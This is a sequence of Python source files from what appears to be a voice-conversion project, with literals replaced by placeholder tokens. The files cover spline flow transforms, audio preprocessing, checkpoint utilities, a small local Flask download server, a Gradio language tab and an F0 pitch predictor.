<s> import torch <EOL> from torch . nn import functional as F <EOL> import numpy as np <EOL> DEFAULT_MIN_BIN_WIDTH = <NUM_LIT> <EOL> DEFAULT_MIN_BIN_HEIGHT = <NUM_LIT> <EOL> DEFAULT_MIN_DERIVATIVE = <NUM_LIT> <EOL> def piecewise_rational_quadratic_transform ( <EOL> inputs , <EOL> unnormalized_widths , <EOL> unnormalized_heights , <EOL> unnormalized_derivatives , <EOL> inverse = False , <EOL> tails = None , <EOL> tail_bound = <NUM_LIT> , <EOL> min_bin_width = DEFAULT_MIN_BIN_WIDTH , <EOL> min_bin_height = DEFAULT_MIN_BIN_HEIGHT , <EOL> min_derivative = DEFAULT_MIN_DERIVATIVE , <EOL> ) : <EOL> if tails is None : <EOL> spline_fn = rational_quadratic_spline <EOL> spline_kwargs = { } <EOL> else : <EOL> spline_fn = unconstrained_rational_quadratic_spline <EOL> spline_kwargs = { "<STR_LIT>" : tails , "<STR_LIT>" : tail_bound } <EOL> outputs , logabsdet = spline_fn ( <EOL> inputs = inputs , <EOL> unnormalized_widths = unnormalized_widths , <EOL> unnormalized_heights = unnormalized_heights , <EOL> unnormalized_derivatives = unnormalized_derivatives , <EOL> inverse = inverse , <EOL> min_bin_width = min_bin_width , <EOL> min_bin_height = min_bin_height , <EOL> min_derivative = min_derivative , <EOL> ** spline_kwargs <EOL> ) <EOL> return outputs , logabsdet <EOL> def searchsorted ( bin_locations , inputs , eps = <NUM_LIT> ) : <EOL> bin_locations [ ... , - <NUM_LIT> ] += eps <EOL> return torch . sum ( inputs [ ... , None ] >= bin_locations , dim = - <NUM_LIT> ) - <NUM_LIT> <EOL> def unconstrained_rational_quadratic_spline ( <EOL> inputs , <EOL> unnormalized_widths , <EOL> unnormalized_heights , <EOL> unnormalized_derivatives , <EOL> inverse = False , <EOL> tails = "<STR_LIT>" , <EOL> tail_bound = <NUM_LIT> , <EOL> min_bin_width = DEFAULT_MIN_BIN_WIDTH , <EOL> min_bin_height = DEFAULT_MIN_BIN_HEIGHT , <EOL> min_derivative = DEFAULT_MIN_DERIVATIVE , <EOL> ) : <EOL> inside_interval_mask = ( inputs >= - tail_bound ) & ( inputs <= tail_bound ) <EOL> outside_interval_mask = ~ inside_interval_mask <EOL> outputs = torch . zeros_like ( inputs ) <EOL> logabsdet = torch . zeros_like ( inputs ) <EOL> if tails == "<STR_LIT>" : <EOL> unnormalized_derivatives = F . pad ( unnormalized_derivatives , pad = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> constant = np . log ( np . exp ( <NUM_LIT> - min_derivative ) - <NUM_LIT> ) <EOL> unnormalized_derivatives [ ... , <NUM_LIT> ] = constant <EOL> unnormalized_derivatives [ ... , - <NUM_LIT> ] = constant <EOL> outputs [ outside_interval_mask ] = inputs [ outside_interval_mask ] <EOL> logabsdet [ outside_interval_mask ] = <NUM_LIT> <EOL> else : <EOL> raise RuntimeError ( "<STR_LIT>" . format ( tails ) ) <EOL> ( <EOL> outputs [ inside_interval_mask ] , <EOL> logabsdet [ inside_interval_mask ] , <EOL> ) = rational_quadratic_spline ( <EOL> inputs = inputs [ inside_interval_mask ] , <EOL> unnormalized_widths = unnormalized_widths [ inside_interval_mask , : ] , <EOL> unnormalized_heights = unnormalized_heights [ inside_interval_mask , : ] , <EOL> unnormalized_derivatives = unnormalized_derivatives [ inside_interval_mask , : ] , <EOL> inverse = inverse , <EOL> left = - tail_bound , <EOL> right = tail_bound , <EOL> bottom = - tail_bound , <EOL> top = tail_bound , <EOL> min_bin_width = min_bin_width , <EOL> min_bin_height = min_bin_height , <EOL> min_derivative = min_derivative , <EOL> ) <EOL> return outputs , logabsdet <EOL> def rational_quadratic_spline ( <EOL> inputs , <EOL> unnormalized_widths , <EOL> unnormalized_heights , <EOL> unnormalized_derivatives , <EOL> inverse = False , <EOL> left = <NUM_LIT> , <EOL> right = <NUM_LIT> , <EOL> bottom = <NUM_LIT> , <EOL> top = <NUM_LIT> , <EOL> min_bin_width = DEFAULT_MIN_BIN_WIDTH , <EOL> min_bin_height = DEFAULT_MIN_BIN_HEIGHT , <EOL> min_derivative = DEFAULT_MIN_DERIVATIVE , <EOL> ) : <EOL> if torch . min ( inputs ) < left or torch . max ( inputs ) > right : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> num_bins = unnormalized_widths . shape [ - <NUM_LIT> ] <EOL> if min_bin_width * num_bins > <NUM_LIT> : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> if min_bin_height * num_bins > <NUM_LIT> : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> widths = F . softmax ( unnormalized_widths , dim = - <NUM_LIT> ) <EOL> widths = min_bin_width + ( <NUM_LIT> - min_bin_width * num_bins ) * widths <EOL> cumwidths = torch . cumsum ( widths , dim = - <NUM_LIT> ) <EOL> cumwidths = F . pad ( cumwidths , pad = ( <NUM_LIT> , <NUM_LIT> ) , mode = "<STR_LIT>" , value = <NUM_LIT> ) <EOL> cumwidths = ( right - left ) * cumwidths + left <EOL> cumwidths [ ... , <NUM_LIT> ] = left <EOL> cumwidths [ ... , - <NUM_LIT> ] = right <EOL> widths = cumwidths [ ... , <NUM_LIT> : ] - cumwidths [ ... , : - <NUM_LIT> ] <EOL> derivatives = min_derivative + F . softplus ( unnormalized_derivatives ) <EOL> heights = F . softmax ( unnormalized_heights , dim = - <NUM_LIT> ) <EOL> heights = min_bin_height + ( <NUM_LIT> - min_bin_height * num_bins ) * heights <EOL> cumheights = torch . cumsum ( heights , dim = - <NUM_LIT> ) <EOL> cumheights = F . pad ( cumheights , pad = ( <NUM_LIT> , <NUM_LIT> ) , mode = "<STR_LIT>" , value = <NUM_LIT> ) <EOL> cumheights = ( top - bottom ) * cumheights + bottom <EOL> cumheights [ ... , <NUM_LIT> ] = bottom <EOL> cumheights [ ... , - <NUM_LIT> ] = top <EOL> heights = cumheights [ ... , <NUM_LIT> : ] - cumheights [ ... , : - <NUM_LIT> ] <EOL> if inverse : <EOL> bin_idx = searchsorted ( cumheights , inputs ) [ ... , None ] <EOL> else : <EOL> bin_idx = searchsorted ( cumwidths , inputs ) [ ... , None ] <EOL> input_cumwidths = cumwidths . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> input_bin_widths = widths . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> input_cumheights = cumheights . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> delta = heights / widths <EOL> input_delta = delta . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> input_derivatives = derivatives . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> input_derivatives_plus_one = derivatives [ ... , <NUM_LIT> : ] . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> input_heights = heights . gather ( - <NUM_LIT> , bin_idx ) [ ... , <NUM_LIT> ] <EOL> if inverse : <EOL> a = ( inputs - input_cumheights ) * ( <EOL> input_derivatives + input_derivatives_plus_one - <NUM_LIT> * input_delta <EOL> ) + input_heights * ( input_delta - input_derivatives ) <EOL> b = input_heights * input_derivatives - ( inputs - input_cumheights ) * ( <EOL> input_derivatives + input_derivatives_plus_one - <NUM_LIT> * input_delta <EOL> ) <EOL> c = - input_delta * ( inputs - input_cumheights ) <EOL> discriminant = b . pow ( <NUM_LIT> ) - <NUM_LIT> * a * c <EOL> assert ( discriminant >= <NUM_LIT> ) . all ( ) <EOL> root = ( <NUM_LIT> * c ) / ( - b - torch . sqrt ( discriminant ) ) <EOL> outputs = root * input_bin_widths + input_cumwidths <EOL> theta_one_minus_theta = root * ( <NUM_LIT> - root ) <EOL> denominator = input_delta + ( <EOL> ( input_derivatives + input_derivatives_plus_one - <NUM_LIT> * input_delta ) <EOL> * theta_one_minus_theta <EOL> ) <EOL> derivative_numerator = input_delta . pow ( <NUM_LIT> ) * ( <EOL> input_derivatives_plus_one * root . pow ( <NUM_LIT> ) <EOL> + <NUM_LIT> * input_delta * theta_one_minus_theta <EOL> + input_derivatives * ( <NUM_LIT> - root ) . pow ( <NUM_LIT> ) <EOL> ) <EOL> logabsdet = torch . log ( derivative_numerator ) - <NUM_LIT> * torch . log ( denominator ) <EOL> return outputs , - logabsdet <EOL> else : <EOL> theta = ( inputs - input_cumwidths ) / input_bin_widths <EOL> theta_one_minus_theta = theta * ( <NUM_LIT> - theta ) <EOL> numerator = input_heights * ( <EOL> input_delta * theta . pow ( <NUM_LIT> ) + input_derivatives * theta_one_minus_theta <EOL> ) <EOL> denominator = input_delta + ( <EOL> ( input_derivatives + input_derivatives_plus_one - <NUM_LIT> * input_delta ) <EOL> * theta_one_minus_theta <EOL> ) <EOL> outputs = input_cumheights + numerator / denominator <EOL> derivative_numerator = input_delta . pow ( <NUM_LIT> ) * ( <EOL> input_derivatives_plus_one * theta . pow ( <NUM_LIT> ) <EOL> + <NUM_LIT> * input_delta * theta_one_minus_theta <EOL> + input_derivatives * ( <NUM_LIT> - theta ) . pow ( <NUM_LIT> ) <EOL> ) <EOL> logabsdet = torch . log ( derivative_numerator ) - <NUM_LIT> * torch . log ( denominator ) <EOL> return outputs , logabsdet <EOL> </s>
<s> from multiprocessing import cpu_count <EOL> import os <EOL> import sys <EOL> from scipy import signal <EOL> from scipy . io import wavfile <EOL> import librosa <EOL> import numpy as np <EOL> now_directory = os . getcwd ( ) <EOL> sys . path . append ( now_directory ) <EOL> from rvc . lib . utils import load_audio <EOL> from rvc . train . slicer import Slicer <EOL> experiment_directory = sys . argv [ <NUM_LIT> ] <EOL> input_root = sys . argv [ <NUM_LIT> ] <EOL> sampling_rate = int ( sys . argv [ <NUM_LIT> ] ) <EOL> percentage = float ( sys . argv [ <NUM_LIT> ] ) <EOL> num_processes = cpu_count ( ) <EOL> import multiprocessing <EOL> class PreProcess : <EOL> def __init__ ( self , sr , exp_dir , per = <NUM_LIT> ) : <EOL> self . slicer = Slicer ( <EOL> sr = sr , <EOL> threshold = - <NUM_LIT> , <EOL> min_length = <NUM_LIT> , <EOL> min_interval = <NUM_LIT> , <EOL> hop_size = <NUM_LIT> , <EOL> max_sil_kept = <NUM_LIT> , <EOL> ) <EOL> self . sr = sr <EOL> self . b_high , self . a_high = signal . butter ( N = <NUM_LIT> , Wn = <NUM_LIT> , btype = "<STR_LIT>" , fs = self . sr ) <EOL> self . per = per <EOL> self . overlap = <NUM_LIT> <EOL> self . tail = self . per + self . overlap <EOL> self . max_amplitude = <NUM_LIT> <EOL> self . alpha = <NUM_LIT> <EOL> self . exp_dir = exp_dir <EOL> self . gt_wavs_dir = f"<STR_LIT>" <EOL> self . wavs16k_dir = f"<STR_LIT>" <EOL> os . makedirs ( self . exp_dir , exist_ok = True ) <EOL> os . makedirs ( self . gt_wavs_dir , exist_ok = True ) <EOL> os . makedirs ( self . wavs16k_dir , exist_ok = True ) <EOL> def normalize_and_write ( self , tmp_audio , idx0 , idx1 ) : <EOL> tmp_max = np . abs ( tmp_audio ) . max ( ) <EOL> if tmp_max > <NUM_LIT> : <EOL> print ( f"<STR_LIT>" ) <EOL> return <EOL> tmp_audio = ( tmp_audio / tmp_max * ( self . max_amplitude * self . alpha ) ) + ( <EOL> <NUM_LIT> - self . alpha <EOL> ) * tmp_audio <EOL> wavfile . write ( <EOL> f"<STR_LIT>" , <EOL> self . sr , <EOL> tmp_audio . astype ( np . float32 ) , <EOL> ) <EOL> tmp_audio = librosa . resample ( <EOL> tmp_audio , orig_sr = self . sr , target_sr = <NUM_LIT> <EOL> ) <EOL> wavfile . write ( <EOL> f"<STR_LIT>" , <EOL> <NUM_LIT> , <EOL> tmp_audio . astype ( np . float32 ) , <EOL> ) <EOL> def process_audio ( self , path , idx0 ) : <EOL> try : <EOL> audio = load_audio ( path , self . sr ) <EOL> audio = signal . lfilter ( self . b_high , self . a_high , audio ) <EOL> idx1 = <NUM_LIT> <EOL> for audio_segment in self . slicer . slice ( audio ) : <EOL> i = <NUM_LIT> <EOL> while <NUM_LIT> : <EOL> start = int ( self . sr * ( self . per - self . overlap ) * i ) <EOL> i += <NUM_LIT> <EOL> if len ( audio_segment [ start : ] ) > self . tail * self . sr : <EOL> tmp_audio = audio_segment [ <EOL> start : start + int ( self . per * self . sr ) <EOL> ] <EOL> self . normalize_and_write ( tmp_audio , idx0 , idx1 ) <EOL> idx1 += <NUM_LIT> <EOL> else : <EOL> tmp_audio = audio_segment [ start : ] <EOL> idx1 += <NUM_LIT> <EOL> break <EOL> self . normalize_and_write ( tmp_audio , idx0 , idx1 ) <EOL> except Exception as error : <EOL> print ( f"<STR_LIT>" ) <EOL> def process_audio_multiprocessing ( self , infos ) : <EOL> for path , idx0 in infos : <EOL> self . process_audio ( path , idx0 ) <EOL> def process_audio_multiprocessing_input_directory ( self , input_root , num_processes ) : <EOL> try : <EOL> infos = [ <EOL> ( f"<STR_LIT>" , idx ) <EOL> for idx , name in enumerate ( sorted ( list ( os . listdir ( input_root ) ) ) ) <EOL> ] <EOL> processes = [ ] <EOL> for i in range ( num_processes ) : <EOL> p = multiprocessing . Process ( <EOL> target = self . process_audio_multiprocessing , <EOL> args = ( infos [ i : : num_processes ] , ) , <EOL> ) <EOL> processes . append ( p ) <EOL> p . start ( ) <EOL> for i in range ( num_processes ) : <EOL> processes [ i ] . join ( ) <EOL> except Exception as error : <EOL> print ( error ) <EOL> def preprocess_training_set ( input_root , sr , num_processes , exp_dir , per ) : <EOL> pp = PreProcess ( sr , exp_dir , per ) <EOL> print ( "<STR_LIT>" ) <EOL> pp . process_audio_multiprocessing_input_directory ( input_root , num_processes ) <EOL> print ( "<STR_LIT>" ) <EOL> if __name__ == "<STR_LIT>" : <EOL> preprocess_training_set ( <EOL> input_root , sampling_rate , num_processes , experiment_directory , percentage <EOL> ) <EOL> </s>
<s> import os , sys <EOL> import signal <EOL> from flask import Flask , request , redirect <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> from core import run_download_script <EOL> app = Flask ( __name__ ) <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" ] ) <EOL> def download ( url ) : <EOL> file_path = run_download_script ( url ) <EOL> if file_path == "<STR_LIT>" : <EOL> if "<STR_LIT>" in request . headers . get ( "<STR_LIT>" , "<STR_LIT>" ) : <EOL> return redirect ( "<STR_LIT>" , code = <NUM_LIT> ) <EOL> else : <EOL> return "<STR_LIT>" <EOL> else : <EOL> return "<STR_LIT>" , <NUM_LIT> <EOL> @ app . route ( "<STR_LIT>" , methods = [ "<STR_LIT>" ] ) <EOL> def shutdown ( ) : <EOL> print ( "<STR_LIT>" ) <EOL> os . kill ( os . getpid ( ) , signal . SIGTERM ) <EOL> if __name__ == "<STR_LIT>" : <EOL> app . run ( host = "<STR_LIT>" , port = <NUM_LIT> ) <EOL> </s>
<s> import os <EOL> import glob <EOL> import json <EOL> import torch <EOL> import argparse <EOL> import numpy as np <EOL> from scipy . io . wavfile import read <EOL> def load_checkpoint ( checkpoint_path , model , optimizer = None , load_opt = <NUM_LIT> ) : <EOL> assert os . path . isfile ( checkpoint_path ) <EOL> checkpoint_dict = torch . load ( checkpoint_path , map_location = "<STR_LIT>" ) <EOL> saved_state_dict = checkpoint_dict [ "<STR_LIT>" ] <EOL> if hasattr ( model , "<STR_LIT>" ) : <EOL> state_dict = model . module . state_dict ( ) <EOL> else : <EOL> state_dict = model . state_dict ( ) <EOL> new_state_dict = { } <EOL> for k , v in state_dict . items ( ) : <EOL> try : <EOL> new_state_dict [ k ] = saved_state_dict [ k ] <EOL> if saved_state_dict [ k ] . shape != state_dict [ k ] . shape : <EOL> print ( <EOL> "<STR_LIT>" , <EOL> k , <EOL> state_dict [ k ] . shape , <EOL> saved_state_dict [ k ] . shape , <EOL> ) <EOL> raise KeyError <EOL> except : <EOL> print ( "<STR_LIT>" , k ) <EOL> new_state_dict [ k ] = v <EOL> if hasattr ( model , "<STR_LIT>" ) : <EOL> model . module . load_state_dict ( new_state_dict , strict = False ) <EOL> else : <EOL> model . load_state_dict ( new_state_dict , strict = False ) <EOL> iteration = checkpoint_dict [ "<STR_LIT>" ] <EOL> learning_rate = checkpoint_dict [ "<STR_LIT>" ] <EOL> if optimizer is not None and load_opt == <NUM_LIT> : <EOL> optimizer . load_state_dict ( checkpoint_dict [ "<STR_LIT>" ] ) <EOL> print ( f"<STR_LIT>" ) <EOL> return model , optimizer , learning_rate , iteration <EOL> def save_checkpoint ( model , optimizer , learning_rate , iteration , checkpoint_path ) : <EOL> print ( f"<STR_LIT>" ) <EOL> if hasattr ( model , "<STR_LIT>" ) : <EOL> state_dict = model . module . state_dict ( ) <EOL> else : <EOL> state_dict = model . state_dict ( ) <EOL> torch . save ( <EOL> { <EOL> "<STR_LIT>" : state_dict , <EOL> "<STR_LIT>" : iteration , <EOL> "<STR_LIT>" : optimizer . state_dict ( ) , <EOL> "<STR_LIT>" : learning_rate , <EOL> } , <EOL> checkpoint_path , <EOL> ) <EOL> def summarize ( <EOL> writer , <EOL> global_step , <EOL> scalars = { } , <EOL> histograms = { } , <EOL> images = { } , <EOL> audios = { } , <EOL> audio_sampling_rate = <NUM_LIT> , <EOL> ) : <EOL> for k , v in scalars . items ( ) : <EOL> writer . add_scalar ( k , v , global_step ) <EOL> for k , v in histograms . items ( ) : <EOL> writer . add_histogram ( k , v , global_step ) <EOL> for k , v in images . items ( ) : <EOL> writer . add_image ( k , v , global_step , dataformats = "<STR_LIT>" ) <EOL> for k , v in audios . items ( ) : <EOL> writer . add_audio ( k , v , global_step , audio_sampling_rate ) <EOL> def latest_checkpoint_path ( dir_path , regex = "<STR_LIT>" ) : <EOL> f_list = glob . glob ( os . path . join ( dir_path , regex ) ) <EOL> f_list . sort ( key = lambda f : int ( "<STR_LIT>" . join ( filter ( str . isdigit , f ) ) ) ) <EOL> x = f_list [ - <NUM_LIT> ] <EOL> return x <EOL> def plot_spectrogram_to_numpy ( spectrogram ) : <EOL> import matplotlib . pylab as plt <EOL> import numpy as np <EOL> fig , ax = plt . subplots ( figsize = ( <NUM_LIT> , <NUM_LIT> ) ) <EOL> im = ax . imshow ( spectrogram , aspect = "<STR_LIT>" , origin = "<STR_LIT>" , interpolation = "<STR_LIT>" ) <EOL> plt . colorbar ( im , ax = ax ) <EOL> plt . xlabel ( "<STR_LIT>" ) <EOL> plt . ylabel ( "<STR_LIT>" ) <EOL> plt . tight_layout ( ) <EOL> fig . canvas . draw ( ) <EOL> data = np . fromstring ( fig . canvas . tostring_rgb ( ) , dtype = np . uint8 , sep = "<STR_LIT>" ) <EOL> data = data . reshape ( fig . canvas . get_width_height ( ) [ : : - <NUM_LIT> ] + ( <NUM_LIT> , ) ) <EOL> plt . close ( ) <EOL> return data <EOL> def load_wav_to_torch ( full_path ) : <EOL> sampling_rate , data = read ( full_path ) <EOL> return torch . FloatTensor ( data . astype ( np . float32 ) ) , sampling_rate <EOL> def load_filepaths_and_text ( filename , split = "<STR_LIT>" ) : <EOL> with open ( filename , encoding = "<STR_LIT>" ) as f : <EOL> filepaths_and_text = [ line . strip ( ) . split ( split ) for line in f ] <EOL> return filepaths_and_text <EOL> def get_hparams ( ) : <EOL> parser = argparse . ArgumentParser ( ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = int , <EOL> required = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = int , required = True , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , default = "<STR_LIT>" , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , default = "<STR_LIT>" , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( "<STR_LIT>" , "<STR_LIT>" , type = str , default = "<STR_LIT>" , help = "<STR_LIT>" ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = int , required = True , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , required = True , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , required = True , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = str , <EOL> default = "<STR_LIT>" , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , "<STR_LIT>" , type = str , required = True , help = "<STR_LIT>" <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = int , <EOL> required = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = int , <EOL> required = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = int , <EOL> required = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = int , <EOL> required = True , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> parser . add_argument ( <EOL> "<STR_LIT>" , <EOL> "<STR_LIT>" , <EOL> type = int , <EOL> default = <NUM_LIT> , <EOL> help = "<STR_LIT>" , <EOL> ) <EOL> args = parser . parse_args ( ) <EOL> name = args . experiment_dir <EOL> experiment_dir = os . path . join ( "<STR_LIT>" , args . experiment_dir ) <EOL> config_save_path = os . path . join ( experiment_dir , "<STR_LIT>" ) <EOL> with open ( config_save_path , "<STR_LIT>" ) as f : <EOL> config = json . load ( f ) <EOL> hparams = HParams ( ** config ) <EOL> hparams . model_dir = hparams . experiment_dir = experiment_dir <EOL> hparams . save_every_epoch = args . save_every_epoch <EOL> hparams . name = name <EOL> hparams . total_epoch = args . total_epoch <EOL> hparams . pretrainG = args . pretrainG <EOL> hparams . pretrainD = args . pretrainD <EOL> hparams . version = args . version <EOL> hparams . gpus = args . gpus <EOL> hparams . train . batch_size = args . batch_size <EOL> hparams . sample_rate = args . sample_rate <EOL> hparams . if_f0 = args . if_f0 <EOL> hparams . if_latest = args . if_latest <EOL> hparams . save_every_weights = args . save_every_weights <EOL> hparams . if_cache_data_in_gpu = args . if_cache_data_in_gpu <EOL> hparams . data . training_files = f"<STR_LIT>" <EOL> hparams . overtraining_detector = args . overtraining_detector <EOL> hparams . overtraining_threshold = args . overtraining_threshold <EOL> return hparams <EOL> class HParams : <EOL> def __init__ ( self , ** kwargs ) : <EOL> for k , v in kwargs . items ( ) : <EOL> if type ( v ) == dict : <EOL> v = HParams ( ** v ) <EOL> self [ k ] = v <EOL> def keys ( self ) : <EOL> return self . __dict__ . keys ( ) <EOL> def items ( self ) : <EOL> return self . __dict__ . items ( ) <EOL> def values ( self ) : <EOL> return self . __dict__ . values ( ) <EOL> def __len__ ( self ) : <EOL> return len ( self . __dict__ ) <EOL> def __getitem__ ( self , key ) : <EOL> return getattr ( self , key ) <EOL> def __setitem__ ( self , key , value ) : <EOL> return setattr ( self , key , value ) <EOL> def __contains__ ( self , key ) : <EOL> return key in self . __dict__ <EOL> def __repr__ ( self ) : <EOL> return self . __dict__ . __repr__ ( ) <EOL> </s>
<s> import os <EOL> import torch <EOL> def change_info ( path , info , name ) : <EOL> try : <EOL> ckpt = torch . load ( path , map_location = "<STR_LIT>" ) <EOL> ckpt [ "<STR_LIT>" ] = info <EOL> if name == "<STR_LIT>" : <EOL> name = os . path . basename ( path ) <EOL> torch . save ( ckpt , f"<STR_LIT>" ) <EOL> return "<STR_LIT>" <EOL> except Exception as error : <EOL> print ( error ) <EOL> </s>
<s> import os , sys <EOL> import json <EOL> import gradio as gr <EOL> from assets . i18n . i18n import I18nAuto <EOL> now_dir = os . getcwd ( ) <EOL> sys . path . append ( now_dir ) <EOL> i18n = I18nAuto ( ) <EOL> config_file = os . path . join ( now_dir , "<STR_LIT>" , "<STR_LIT>" ) <EOL> def get_language_settings ( ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> if config [ "<STR_LIT>" ] [ "<STR_LIT>" ] == False : <EOL> return "<STR_LIT>" <EOL> else : <EOL> return config [ "<STR_LIT>" ] [ "<STR_LIT>" ] <EOL> def save_lang_settings ( selected_language ) : <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> config = json . load ( file ) <EOL> if selected_language == "<STR_LIT>" : <EOL> config [ "<STR_LIT>" ] [ "<STR_LIT>" ] = False <EOL> else : <EOL> config [ "<STR_LIT>" ] [ "<STR_LIT>" ] = True <EOL> config [ "<STR_LIT>" ] [ "<STR_LIT>" ] = selected_language <EOL> gr . Info ( "<STR_LIT>" ) <EOL> with open ( config_file , "<STR_LIT>" , encoding = "<STR_LIT>" ) as file : <EOL> json . dump ( config , file , indent = <NUM_LIT> ) <EOL> def lang_tab ( ) : <EOL> with gr . Column ( ) : <EOL> selected_language = gr . Dropdown ( <EOL> label = i18n ( "<STR_LIT>" ) , <EOL> info = i18n ( <EOL> "<STR_LIT>" <EOL> ) , <EOL> value = get_language_settings ( ) , <EOL> choices = [ "<STR_LIT>" ] <EOL> + i18n . _get_available_languages ( ) , <EOL> interactive = True , <EOL> ) <EOL> selected_language . change ( <EOL> fn = save_lang_settings , <EOL> inputs = [ selected_language ] , <EOL> outputs = [ ] , <EOL> ) <EOL> </s>
<s> from infer_pack . modules . F0Predictor . F0Predictor import F0Predictor <EOL> import pyworld <EOL> import numpy as np <EOL> class DioF0Predictor ( F0Predictor ) : <EOL> def __init__ ( self , hop_length = <NUM_LIT> , f0_min = <NUM_LIT> , f0_max = <NUM_LIT> , sampling_rate = <NUM_LIT> ) : <EOL> self . hop_length = hop_length <EOL> self . f0_min = f0_min <EOL> self . f0_max = f0_max <EOL> self . sampling_rate = sampling_rate <EOL> def interpolate_f0 ( self , f0 ) : <EOL> data = np . reshape ( f0 , ( f0 . size , <NUM_LIT> ) ) <EOL> vuv_vector = np . zeros ( ( data . size , <NUM_LIT> ) , dtype = np . float32 ) <EOL> vuv_vector [ data > <NUM_LIT> ] = <NUM_LIT> <EOL> vuv_vector [ data <= <NUM_LIT> ] = <NUM_LIT> <EOL> ip_data = data <EOL> frame_number = data . size <EOL> last_value = <NUM_LIT> <EOL> for i in range ( frame_number ) : <EOL> if data [ i ] <= <NUM_LIT> : <EOL> j = i + <NUM_LIT> <EOL> for j in range ( i + <NUM_LIT> , frame_number ) : <EOL> if data [ j ] > <NUM_LIT> : <EOL> break <EOL> if j < frame_number - <NUM_LIT> : <EOL> if last_value > <NUM_LIT> : <EOL> step = ( data [ j ] - data [ i - <NUM_LIT> ] ) / float ( j - i ) <EOL> for k in range ( i , j ) : <EOL> ip_data [ k ] = data [ i - <NUM_LIT> ] + step * ( k - i + <NUM_LIT> ) <EOL> else : <EOL> for k in range ( i , j ) : <EOL> ip_data [ k ] = data [ j ] <EOL> else : <EOL> for k in range ( i , frame_number ) : <EOL> ip_data [ k ] = last_value <EOL> else : <EOL> ip_data [ i ] = data [ i ] <EOL> last_value = data [ i ] <EOL> return ip_data [ : , <NUM_LIT> ] , vuv_vector [ : , <NUM_LIT> ] <EOL> def resize_f0 ( self , x , target_len ) : <EOL> source = np . array ( x ) <EOL> source [ source < <NUM_LIT> ] = np . nan <EOL> target = np . interp ( <EOL> np . arange ( <NUM_LIT> , len ( source ) * target_len , len ( source ) ) / target_len , <EOL> np . arange ( <NUM_LIT> , len ( source ) ) , <EOL> source , <EOL> ) <EOL> res = np . nan_to_num ( target ) <EOL> return res <EOL> def compute_f0 ( self , wav , p_len = None ) : <EOL> if p_len is None : <EOL> p_len = wav . shape [ <NUM_LIT> ] // self . hop_length <EOL> f0 , t = pyworld . dio ( <EOL> wav . astype ( np . double ) , <EOL> fs = self . sampling_rate , <EOL> f0_floor = self . f0_min , <EOL> f0_ceil = self . f0_max , <EOL> frame_period = <NUM_LIT> * self . hop_length / self . sampling_rate , <EOL> ) <EOL> f0 = pyworld . stonemask ( wav . astype ( np . double ) , f0 , t , self . sampling_rate ) <EOL> for index , pitch in enumerate ( f0 ) : <EOL> f0 [ index ] = round ( pitch , <NUM_LIT> ) <EOL> return self . interpolate_f0 ( self . resize_f0 ( f0 , p_len ) ) [ <NUM_LIT> ] <EOL> def compute_f0_uv ( self , wav , p_len = None ) : <EOL> if p_len is None : <EOL> p_len = wav . shape [ <NUM_LIT> ] // self . hop_length <EOL> f0 , t = pyworld . dio ( <EOL> wav . astype ( np . double ) , <EOL> fs = self . sampling_rate , <EOL> f0_floor = self . f0_min , <EOL> f0_ceil = self . f0_max , <EOL> frame_period = <NUM_LIT> * self . hop_length / self . sampling_rate , <EOL> ) <EOL> f0 = pyworld . stonemask ( wav . astype ( np . double ) , f0 , t , self . sampling_rate ) <EOL> for index , pitch in enumerate ( f0 ) : <EOL> f0 [ index ] = round ( pitch , <NUM_LIT> ) <EOL> return self . interpolate_f0 ( self . resize_f0 ( f0 , p_len ) ) <EOL> </s>
